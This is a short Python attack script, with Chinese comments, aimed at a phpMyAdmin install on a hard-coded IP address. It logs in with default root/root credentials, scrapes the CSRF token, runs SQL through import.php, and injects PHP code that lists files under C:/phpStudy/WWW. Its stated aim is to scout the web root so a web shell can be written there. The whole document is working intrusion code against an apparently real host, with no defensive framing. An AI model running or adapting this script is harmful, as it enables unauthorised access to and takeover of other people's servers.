#!/usr/bin/env python3
"""pma PHP执行通道: 侦察web根目录 + 写shell到正确路径"""
import urllib.request, http.cookiejar, re, urllib.parse, time

B = "http://81.70.245.25/phpmyadmin/"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]
html = op.open(B, timeout=10).read().decode("utf-8", "ignore")
tok = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
data = f"pma_username=root&pma_password=root&server=1&token={tok}".encode()
op.open(urllib.request.Request(B + "index.php", data=data), timeout=10).read()

def sql(q):
    qq = urllib.parse.urlencode({"token": tok, "sql_query": q, "ajax_request": "true", "db": "mysql"})
    r = op.open(urllib.request.Request(B + "import.php?" + qq, data=b""), timeout=15)
    return r.read().decode("utf-8", "ignore")

# 1. getcwd + 列出可能 webroot
p1 = "SELECT '<?php echo \"CWD:\" . getcwd() . \"|\" . implode(\",\", glob(\"C:/phpStudy/WWW/*.php\")) . \"|\" . implode(\",\", glob(\"C:/phpStudy/WWW/*\"));?>'"
r = sql(p1)
print("=== 侦察 ===")
# 提取 SELECT 结果部分
m = re.search(r'CWD:[^<"]+', r)
print("CWD/glob:", m.group(0)[:300] if m else "none", flush=True)
# 原始body里找
import html as h
body = h.unescape(re.sub(r'<[^>]+>', '', r))
idx = body.find('CWD:')
print("raw:", body[idx:idx+300] if idx >= 0 else body[:200])
